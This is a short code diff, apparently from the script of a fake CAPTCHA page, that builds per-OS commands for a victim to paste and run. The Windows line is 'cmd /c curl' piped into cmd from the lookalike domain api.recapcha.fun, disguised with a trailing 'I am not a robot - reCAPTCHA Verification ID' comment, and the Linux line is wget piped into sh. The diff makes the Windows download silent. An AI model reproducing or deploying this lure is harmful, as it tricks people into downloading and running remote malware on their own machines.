@@ -924,7 +924,7 @@
 
         let htaPath;
         if (osType === "Windows") {
-            htaPath = "cmd /c curl https://api.recapcha.fun/auth/v1?token=202 | cmd :: ✅ ''I am not a robot - reCAPTCHA Verification ID: 6005''";
+            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd :: ✅ ''I am not a robot - reCAPTCHA Verification ID: 6005''";
         } else if (osType === "Linux") {
             htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
         } else if (osType === "MacOS") {
@@ -1272,7 +1272,7 @@
 
         let htaPath;
         if (osType === "Windows") {
-            htaPath = "cmd /c curl https://api.recapcha.fun/auth/v1?token=202 | cmd :: ✅ ''I am not a robot - reCAPTCHA Verification ID: 6005''";
+            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd :: ✅ ''I am not a robot - reCAPTCHA Verification ID: 6005''";
         } else if (osType === "Linux") {
             htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
         } else if (osType === "MacOS") {
